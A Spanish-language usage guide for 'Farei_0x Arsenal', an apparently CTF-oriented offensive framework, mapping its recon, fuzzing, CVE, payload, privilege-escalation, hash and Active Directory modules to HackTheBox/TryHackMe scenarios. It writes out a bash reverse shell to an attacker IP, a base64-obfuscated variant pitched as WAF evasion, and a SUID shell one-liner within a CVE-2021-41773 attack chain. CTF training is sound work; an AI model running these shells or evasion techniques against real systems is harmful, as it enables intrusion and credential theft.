# 🗺️ Mapa Completo de Uso - Farei_0x Arsenal

> **Guía definitiva de cuándo, cómo y por qué usar cada módulo del framework durante cualquier competición CTF.**

---

## 📊 Diagrama General del Flujo de Ataque

```
┌─────────────────────────────────────────────────────────────────────┐
│                        INICIO DEL CTF                              │
│                   "Te dan una IP objetivo"                         │
└──────────────────────────┬──────────────────────────────────────────┘
                           │
                           ▼
              ┌────────────────────────┐
              │   FASE 1: RECON        │
              │   Farei_0x.py recon    │
              │   "¿Qué tiene abierto?"│
              └────────────┬───────────┘
                           │
              ┌────────────┴───────────────────────────┐
              │                                        │
              ▼                                        ▼
   ┌──────────────────┐                    ┌──────────────────────┐
   │ ¿Puerto 80/443?  │                    │ ¿Puerto 88/445/389? │
   │ Hay una WEB      │                    │ Hay ACTIVE DIRECTORY │
   └────────┬─────────┘                    └──────────┬───────────┘
            │                                         │
            ▼                                         ▼
   ┌──────────────────┐                    ┌──────────────────────┐
   │ FASE 2: FUZZ     │                    │ FASE 2: AD           │
   │ Farei_0x.py fuzz │                    │ Farei_0x.py ad       │
   │ "¿Qué hay oculto?"│                   │ "¿Quién es admin?"   │
   └────────┬─────────┘                    └──────────┬───────────┘
            │                                         │
            ▼                                         ▼
   ┌──────────────────┐                    ┌──────────────────────┐
   │ TÚ: Leer código  │                    │ TÚ: Lanzar ataques  │
   │ Ctrl+U, Burp, etc│                    │ Kerberoast, AS-REP   │
   └────────┬─────────┘                    └──────────┬───────────┘
            │                                         │
            ▼                                         ▼
   ┌──────────────────┐                    ┌──────────────────────┐
   │ FASE 3: CVE      │                    │ FASE 3: HASHES       │
   │ Farei_0x.py cve  │                    │ Farei_0x.py hashes   │
   │ "¿Hay exploit?"  │                    │ "Crackear tickets"   │
   └────────┬─────────┘                    └──────────┬───────────┘
            │                                         │
            └────────────────┬────────────────────────┘
                             │
                             ▼
                ┌────────────────────────┐
                │   FASE 4: PAYLOAD      │
                │   Farei_0x.py payload  │
                │   "Dame una shell"     │
                └────────────┬───────────┘
                             │
                             ▼
                ┌────────────────────────┐
                │   ESTÁS DENTRO 💥      │
                │   user.txt capturada   │
                └────────────┬───────────┘
                             │
                             ▼
                ┌────────────────────────┐
                │   FASE 5: ESCALAR      │
                │   crypto / hashes      │
                │   "¿Qué encontré?"     │
                └────────────┬───────────┘
                             │
                             ▼
                ┌────────────────────────┐
                │   root.txt capturada   │
                │   MÁQUINA PWNED 🏴‍☠️    │
                └────────────┬───────────┘
                             │
                             ▼
                ┌────────────────────────┐
                │   FASE FINAL: REPORT   │
                │   Farei_0x.py report   │
                │   "Documentar todo"    │
                └────────────────────────┘
```

---

## 🎯 Escenario 1: Máquina Web (Easy/Medium)

> **Ejemplo:** Una máquina de TryHackMe con un servidor web vulnerable.

| Paso | Acción | Comando Farei_0x | ¿Por qué? |
|------|--------|-------------------|------------|
| 1 | Descubrir puertos | `recon 10.10.10.X` | Saber qué servicios corren |
| 2 | Buscar rutas ocultas | `fuzz 10.10.10.X` | Encontrar `/admin`, `/backup`, `/api` |
| 3 | Leer la web | **Manual** (Ctrl+U, Burp) | Identificar tecnología y versión |
| 4 | Buscar exploit | `cve "Apache 2.4.49"` | Obtener el PoC de GitHub al instante |
| 5 | Preparar shell | `payload TU_IP 4444 --base64` | Shell ofuscada lista para pegar |
| 6 | Entrar a la máquina | **Manual** (ejecutar exploit) | Lanzar el ataque con la shell |
| 7 | Buscar pistas | `crypto "cadena_rara"` | Decodificar archivos cifrados que encuentres |
| 8 | Documentar | `report` | Reporte automático con todo lo encontrado |

---

## 🎯 Escenario 2: Máquina Active Directory (Hard/Insane)

> **Ejemplo:** Una máquina de HackTheBox con un Domain Controller.

| Paso | Acción | Comando Farei_0x | ¿Por qué? |
|------|--------|-------------------|------------|
| 1 | Descubrir puertos | `recon 10.10.10.X` | Ver si tiene 88 (Kerberos), 445 (SMB), 389 (LDAP) |
| 2 | Enumerar AD | `ad 10.10.10.X corp.local` | Te da los comandos de Impacket listos para copiar |
| 3 | Extraer usuarios | **Manual** (rpcclient, enum4linux) | Conseguir lista de usuarios del dominio |
| 4 | Analizar BloodHound | `ad --parse users.json` | Encontrar quién es vulnerable a AS-REP/Kerberoast |
| 5 | Crackear hashes | `hashes ticket.txt` | Identificar hash + comando de Hashcat exacto |
| 6 | Buscar exploit | `cve "Exchange 2019"` | Si hay un servicio web corporativo vulnerable |
| 7 | Shell como admin | `payload TU_IP 4444` | Reverse shell para el Domain Controller |
| 8 | Documentar | `report` | Todo el ataque de AD documentado en tablas |

---

## 🎯 Escenario 3: Máquina con Criptografía (CTF Jeopardy)

> **Ejemplo:** Un reto de TryHackMe donde te dan cadenas cifradas.

| Paso | Acción | Comando Farei_0x | ¿Por qué? |
|------|--------|-------------------|------------|
| 1 | Te dan una cadena | `crypto "VkVoTmUyUn..."` | Decodifica Base64/32/Hex + busca flags automático |
| 2 | Está en doble capa | El módulo lo resuelve solo | Decodificación recursiva (hasta 5 capas) |
| 3 | Es un ROT raro | `crypto "AOT{yva_zlclu}"` | Prueba los 25 ROTs y te dice cuál tiene la flag |
| 4 | Es un binario | El módulo lo extrae a `.bin` | Te guarda el archivo + extrae texto legible |
| 5 | Es un ticket Kerberos | `crypto "YIIG..."` | Detecta que es binario y lo reconstruye |

---

## 🎯 Escenario 4: Máquina Linux con Escalada de Privilegios

> **Ejemplo:** Ya estás dentro como `www-data` y necesitas escalar a `root`.

| Paso | Acción | Comando Farei_0x | ¿Por qué? |
|------|--------|-------------------|------------|
| 1 | Encontraste `/etc/shadow` | `hashes /etc/shadow` | Extrae hashes + identifica tipo + te da el hashcat |
| 2 | Encontraste un archivo `.db` | `hashes backup.db` | Lee archivos binarios sin crashear |
| 3 | Hay una nota cifrada | `crypto "mensaje_raro"` | Decodifica pistas del admin |
| 4 | Encontraste un servicio viejo | `cve "sudo 1.8.31"` | Busca CVE de escalada de privilegios |
| 5 | Necesitas otra shell | `payload TU_IP 5555` | Shell nueva para moverte lateralmente |

---

## 🎯 Escenario 5: Máquina Windows (sin AD)

> **Ejemplo:** Un servidor Windows standalone con IIS o servicios SMB.

| Paso | Acción | Comando Farei_0x | ¿Por qué? |
|------|--------|-------------------|------------|
| 1 | Descubrir puertos | `recon 10.10.10.X` | Ver si tiene 80 (IIS), 445 (SMB), 3389 (RDP) |
| 2 | Buscar rutas web | `fuzz 10.10.10.X` | Encontrar páginas de IIS ocultas |
| 3 | Buscar exploit | `cve "IIS 10.0"` | Obtener exploit para la versión de IIS |
| 4 | Shell para Windows | `payload TU_IP 4444 --base64` | Genera PowerShell codificada en Base64 |
| 5 | Encontraste SAM/SYSTEM | `hashes sam_dump.txt` | Identifica hashes NTLM |
| 6 | Pass-The-Hash | **Manual** (impacket-psexec) | Usás el hash para entrar como admin |
| 7 | Documentar | `report` | Todo el ataque Windows documentado |

---

## 🎯 Escenario 6: Competición en Vivo (King of the Hill / Battlegrounds)

> **Ejemplo:** Competición en tiempo real contra otros jugadores.

| Paso | Acción | Comando Farei_0x | ¿Por qué? |
|------|--------|-------------------|------------|
| 1 | Speed-scan | `recon TARGET` | **3 segundos** vs 2 minutos de los demás |
| 2 | Fuzz inmediato | `fuzz TARGET` | Anti-Rabbit-Hole te ahorra caer en trampas |
| 3 | Exploit al toque | `cve "servicio"` | Link de GitHub en **3 segundos** |
| 4 | Shell ofuscada | `payload IP PORT --base64` | Evadís WAFs que los demás no pueden |
| 5 | Reporte final | `report` | Writeup profesional mientras los otros toman notas |

> ⚡ **Ventaja competitiva:** Mientras los demás están buscando en Google y copiando comandos de cheatsheets, vos ya estás dentro de la máquina.

---

## 🚫 Escenarios donde NO usarías Farei_0x

| Situación | Herramienta correcta |
|---|---|
| Inyección SQL manual | **Burp Suite** o **sqlmap** |
| Ingeniería inversa de un binario | **Ghidra** o **IDA Pro** |
| Análisis de malware | **Any.Run** o **VirusTotal** |
| Escaneo de vulnerabilidades web completo | **Nikto** o **OWASP ZAP** |
| Escalada de privilegios Linux (enumerar) | **LinPEAS** o **pspy** |
| Buffer Overflow / Exploit Development | **GDB** + **pwntools** |
| Esteganografía (imágenes con datos ocultos) | **steghide** o **binwalk** |

---

## 💥 Cadena Completa: CVE → Payload → Shell (El Flow Real)

> Esto es lo que muchos no entienden. El `cve` y el `payload` no son comandos independientes — son **dos mitades de la misma operación**. Acá te muestro cómo se usan juntos en la práctica.

### 🔗 Ejemplo Real: Apache 2.4.49 Path Traversal + RCE (CVE-2021-41773)

**Situación:** El recon te encontró Apache 2.4.49 en el puerto 80.

---

**PASO 1 — Identificar el CVE:**
```bash
python Farei_0x.py cve "Apache 2.4.49"
```
```
[CRITICAL 9.8] CVE-2021-41773
↳ http://packetstormsecurity.com/files/164418/...
📦 CVE-2021-41773:
  💻 git clone https://github.com/Soliux/CVE-2021-41773.git
```

---

**PASO 2 — Preparar tu Listener y tu Shell:**

En una terminal aparte, ponés tu listener:
```bash
nc -lvnp 4444
```

En otra terminal, generás la shell con Farei_0x:
```bash
python Farei_0x.py payload 10.10.14.5 4444
```
```
[*] Bash (TCP):
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
```

---

**PASO 3 — Descargar y ejecutar el exploit:**
```bash
git clone https://github.com/Soliux/CVE-2021-41773.git
cd CVE-2021-41773
python3 exploit.py 10.10.10.X
```

Cuando el exploit te pida qué comando ejecutar en la víctima, **pegás la shell de Bash**:
```
[*] Enter command: bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
```

---

**PASO 4 — La máquina te llama de vuelta:**
```
# En tu listener de nc:
Connection received from 10.10.10.X:
www-data@target:/var/www/html$
```
**¡ESTÁS DENTRO! 💥**

---

**PASO 5 — Si hay WAF que bloquea la shell normal:**
```bash
python Farei_0x.py payload 10.10.14.5 4444 --base64
```
```
echo YmFzaCAtaSA+... | base64 -d | bash
```
Pegás la versión ofuscada → el WAF no la reconoce como shell.

---

### 📐 ¿Por qué necesitás AMBOS módulos?

```
                    ┌─────────────────┐
                    │   cve           │
                    │ "CVE-2021-41773"│
                    │ Te da el HUECO  │
                    └────────┬────────┘
                             │
                             ▼
              El exploit abre acceso al servidor
              pero necesita saber QUÉ ejecutar
                             │
                             ▼
                    ┌─────────────────┐
                    │   payload       │
                    │ "bash -i >& ..."│
                    │ Te da la PUERTA │
                    └────────┬────────┘
                             │
                             ▼
                      Tu shell llega 💥
```

> **CVE** = el exploit abre la vulnerabilidad
> **Payload** = la shell que viaja por esa apertura hasta vos

---

## 🌐 Escenario 7: VHost Fuzzing — Máquinas tipo "Takeover" (HTB)

> **Ejemplo:** HTB Takeover, donde la IP tiene un dominio y hay subdominios ocultos. El fuzzer normal de directorios no los encuentra porque están en `dev.target.htb`, no en `target.htb/dev`.

### ¿Cuándo usarlo?

Cuando en el recon ves que:
- La web redirige a un dominio (ej: `http://10.10.10.X` → `http://target.htb`)
- Ya agregaste el dominio a `/etc/hosts`
- Sospechás que hay subdominios ocultos

### Comandos:

**Primero agregás el dominio a /etc/hosts:**
```bash
echo "10.10.10.X target.htb" | sudo tee -a /etc/hosts
```

**Fuzzing de directorios normal:**
```bash
python Farei_0x.py fuzz 10.10.10.X -w /usr/share/wordlists/dirb/common.txt
```

**VHost Fuzzing — el modo nuevo 🆕:**
```bash
python Farei_0x.py fuzz 10.10.10.X --vhost --domain target.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

**Si no tenés SecLists, usa la lista de respaldo integrada:**
```bash
python Farei_0x.py fuzz 10.10.10.X --vhost --domain target.htb
```

### ¿Cómo detecta subdominios?

El fuzzer manda peticiones HTTP con la cabecera `Host: dev.target.htb` a la misma IP. Si la respuesta tiene **más de 50 bytes de diferencia** respecto a la respuesta base, o la redirección contiene el subdominio, **lo marca como encontrado**. Así detecta cambios sutiles que un fuzzer básico ignoraría.

```
[VHOST FOUND] dev.target.htb [Status: 200] [Size: 4821] [Diff: +4300B]
[VHOST FOUND] admin.target.htb [Status: 302] [Size: 0] [Diff: +120B]
```

Después de encontrar subdominios, los agregás a `/etc/hosts` y los fuzzeas normalmente.

---

## 📋 Cheatsheet Rápido — Todos los Comandos (14 Módulos)

```bash
# ── RECONOCIMIENTO ──────────────────────────────────────────────
python Farei_0x.py recon 10.10.10.X                             # 3 fases: puertos → versiones → sugerencias
python Farei_0x.py fuzz 10.10.10.X                              # Directorios (async + anti-rabbit-hole)
python Farei_0x.py fuzz 10.10.10.X --vhost --domain target.htb  # VHosts/Subdominios
python Farei_0x.py fuzz 10.10.10.X -w /ruta/wordlist.txt        # Wordlist personalizada
python Farei_0x.py osint target.htb                             # WHOIS, DNS, crt.sh, fingerprint, dorks

# ── EXPLOTACIÓN ─────────────────────────────────────────────────
python Farei_0x.py cve "Apache 2.4.49"                          # CVE por servicio (NVD + GitHub)
python Farei_0x.py cve "CVE-2021-41773"                         # CVE por ID directo
python Farei_0x.py sqli --url "http://IP/login.php"             # SQLi + NoSQL + SSTI + sqlmap
python Farei_0x.py smb 10.10.10.X                               # SMB null session completo
python Farei_0x.py smb 10.10.10.X -u admin -p Pass123           # SMB con creds + DCSync + Kerberoast
python Farei_0x.py payload TU_IP PUERTO                         # 10 reverse shells
python Farei_0x.py payload TU_IP PUERTO --base64                # Evadir WAF
python Farei_0x.py payload TU_IP PUERTO --urlencode             # Para web exploits

# ── POST-EXPLOTACIÓN ────────────────────────────────────────────
python Farei_0x.py payload --upgrade                            # TTY + pivoting + file transfer
python Farei_0x.py privesc --os linux                           # 15+ vectores Linux (SUID/sudo/grupos/cron)
python Farei_0x.py privesc --os windows                         # 12+ vectores Windows (Potatoes/SAM/WinPEAS)

# ── ANÁLISIS CRIPTOGRÁFICO ──────────────────────────────────────
python Farei_0x.py crypto "VEhNe2ZsYWd9"                        # Base64/32/Hex/ROT recursivo (5 capas)
python Farei_0x.py encoder ".... .- -.-. -.-"                   # Morse, Atbash, Vigenere, Rail Fence
python Farei_0x.py encoder "1b1e0857001f061a"                   # XOR brute force
python Farei_0x.py encoder "TEXTO" --key CLAVE                  # Vigenere con key

# ── HASHES Y AD ─────────────────────────────────────────────────
python Farei_0x.py hashes /etc/shadow                           # 17 tipos (Kerberos, NTLMv2, bcrypt...)
python Farei_0x.py hashes secretsdump.txt                       # Parsea formato secretsdump/Responder
python Farei_0x.py ad 10.10.10.X corp.local                     # Impacket commands + BloodHound
python Farei_0x.py ad --parse users.json                        # Analizar BloodHound offline

# ── REPORTE ─────────────────────────────────────────────────────
python Farei_0x.py report                                       # Markdown completo de la sesión
```

---

## 🗺️ Mapa de Módulos por Fase de Ataque

```
RECONOCIMIENTO          ENUMERACIÓN             EXPLOTACIÓN
──────────────          ──────────────          ─────────────
recon (nmap 3F)    →    fuzz (dirs/vhosts) →    cve (NVD+GitHub)
osint (pasivo)     →    smb (null→creds)   →    sqli (+SSTI)
                        ad (BloodHound)    →    payload (10 shells)

POST-EXPLOTACIÓN        ANÁLISIS                DOCUMENTACIÓN
──────────────────      ────────────            ─────────────
payload --upgrade  →    crypto (B64/ROT)   →    report (Markdown)
privesc linux/win  →    encoder (Morse/XOR)→
hashes (17 tipos)  →
```

---

## 🎯 Escenario 8: SQLi + SSTI en Máquina Web

> El módulo `sqli` v2.0 cubre casos que antes requerían buscar en Google.

| Caso | Comando | Resultado |
|------|---------|-----------|
| Formulario de login | `sqli --url "http://IP/login"` | Payloads de detección por DB + sqlmap |
| WAF bloqueando | Output incluye 7 técnicas de bypass | space2comment, randomcase, double encode |
| Parámetro GET | `sqli --url "http://IP/page?id=1"` | UNION-based paso a paso |
| Template injection | Output incluye payloads SSTI | Jinja2 / Twig / Freemarker |
| MongoDB | Output incluye NoSQL payloads | `{$ne: ""}` y variantes |

---

## 🎯 Escenario 9: Post-Explotación Completa (Linux)

> Ya estás dentro como `www-data`. El flujo Obsidian:

| Paso | Comando | Qué hace |
|------|---------|----------|
| 1 | `payload --upgrade` | TTY completa en 4 pasos + socat alternativo |
| 2 | `privesc --os linux` | 15 vectores: SUID, sudo -l, groups, cron, caps |
| 3 | ¿Encontraste SUID `find`? | El módulo ya incluye el one-liner: `find . -exec /bin/sh -p \; -quit` |
| 4 | ¿Hay servicio en 127.0.0.1? | `payload --upgrade` incluye Chisel port forwarding |
| 5 | `hashes /etc/shadow` | Identifica tipo + comando hashcat exacto |
| 6 | `report` | Todo documentado |

---

## 🎯 Escenario 10: Post-Explotación Completa (Windows)

> Ya tenés shell como usuario. El flujo Obsidian:

| Paso | Comando | Qué hace |
|------|---------|----------|
| 1 | `payload --upgrade` | rlwrap para historial, evil-winrm, SMB transfer |
| 2 | `privesc --os windows` | Potato attacks, AlwaysInstallElevated, SAM dump |
| 3 | ¿Encontraste NTLM hashes? | `hashes secretsdump.txt` → modo hashcat + john |
| 4 | ¿Hay AD? | `smb IP -u user -p pass` → DCSync, Kerberoast |
| 5 | `report` | Todo documentado |

---

## 🎯 Escenario 11: OSINT + VHost Combo (máquinas con dominio)

> Máquinas como Trick, Sneaky, Forest donde el dominio es clave.

```bash
# 1. Recon inicial
python Farei_0x.py recon 10.10.10.X

# 2. OSINT pasivo — encontrar subdominios sin fuerza bruta
python Farei_0x.py osint target.htb
# → crt.sh encuentra: dev.target.htb, admin.target.htb

# 3. Agregar a /etc/hosts
echo "10.10.10.X target.htb dev.target.htb admin.htb" | sudo tee -a /etc/hosts

# 4. VHost fuzzing activo para encontrar más
python Farei_0x.py fuzz 10.10.10.X --vhost --domain target.htb

# 5. Fuzzear cada subdominio encontrado
python Farei_0x.py fuzz 10.10.10.X  # Con URL http://dev.target.htb
```

---

## 🎯 Escenario 12: CTF Crypto/Jeopardy — Cifrados Clásicos

> El módulo `encoder` v2.0 cubre lo que `crypto` no puede.

| Input | Comando | Detecta |
|-------|---------|---------|
| `.... .- -.-. -.-` | `encoder ".... .- -.-."` | Morse Code |
| `ZYLWRE` | `encoder "ZYLWRE"` | Atbash automático |
| `01001000 01001001` | `encoder "01001000..."` | Binary → ASCII |
| `1b1e0857001f` | `encoder "1b1e0857001f"` | XOR brute force (255 keys) |
| `RIJVS` + key `KEY` | `encoder "RIJVS" --key KEY` | Vigenere |
| `AABBB BAABB` | `encoder "AABBB BAABB"` | Bacon Cipher |
| `w6u_E=4C6]` | `encoder "w6u_E=4C6]"` | ROT-47 |

---

## 🚫 Escenarios donde NO usarías Farei_0x

| Situación | Herramienta correcta |
|---|---|
| Ingeniería inversa de un binario | **Ghidra** o **IDA Pro** |
| Análisis de malware | **Any.Run** o **VirusTotal** |
| Buffer Overflow / Exploit Development | **GDB** + **pwntools** |
| Esteganografía | **steghide**, **binwalk**, **stegsolve** |
| Fuzzing de parámetros HTTP (avanzado) | **Burp Suite Intruder** |
| Captura de tráfico en vivo | **Wireshark** / **tcpdump** |

---

## 💡 Regla de Oro

```
┌──────────────────────────────────────────────────────────┐
│                                                          │
│   Si la tarea es MECÁNICA y REPETITIVA  →  Farei_0x     │
│   Si la tarea requiere PENSAR y CREAR   →  Tu cerebro   │
│                                                          │
└──────────────────────────────────────────────────────────┘
```

> *"Las herramientas no hacen al hacker. El hacker hace las herramientas."*
> — Farei_0x Arsenal, 2026 | 14 módulos · Obsidian Tier · Top 7 Argentina 🏴‍☠️


```bash
# RECON
python Farei_0x.py recon 10.10.10.X

# FUZZ — Directorios
python Farei_0x.py fuzz 10.10.10.X
python Farei_0x.py fuzz 10.10.10.X -w /ruta/wordlist.txt

# FUZZ — VHosts/Subdominios (NUEVO)
python Farei_0x.py fuzz 10.10.10.X --vhost --domain target.htb
python Farei_0x.py fuzz 10.10.10.X --vhost --domain target.htb -w /ruta/dns.txt

# PAYLOAD — Shells
python Farei_0x.py payload TU_IP PUERTO
python Farei_0x.py payload TU_IP PUERTO --base64      # Evadir WAF
python Farei_0x.py payload TU_IP PUERTO --urlencode   # Para web exploits

# CVE — Por servicio o por ID directo
python Farei_0x.py cve "Apache 2.4.49"
python Farei_0x.py cve "CVE-2021-41773"

# CRYPTO — Decodificador recursivo
python Farei_0x.py crypto "VEhNe2ZsYWd9"
python Farei_0x.py crypto "%56%45%68%4E..."           # URL-encoded auto-detectado

# HASHES — 17 tipos de hash
python Farei_0x.py hashes /etc/shadow
python Farei_0x.py hashes secretsdump.txt
python Farei_0x.py hashes ticket.kirbi

# ACTIVE DIRECTORY
python Farei_0x.py ad 10.10.10.X corp.local
python Farei_0x.py ad --parse users.json

# REPORTE FINAL
python Farei_0x.py report
```

---

## 💡 Regla de Oro

```
┌──────────────────────────────────────────────────────────┐
│                                                          │
│   Si la tarea es MECÁNICA y REPETITIVA  →  Farei_0x     │
│   Si la tarea requiere PENSAR y CREAR   →  Tu cerebro   │
│                                                          │
└──────────────────────────────────────────────────────────┘
```

---

> *"Las herramientas no hacen al hacker. El hacker hace las herramientas."*
> — Farei_0x Arsenal, 2026
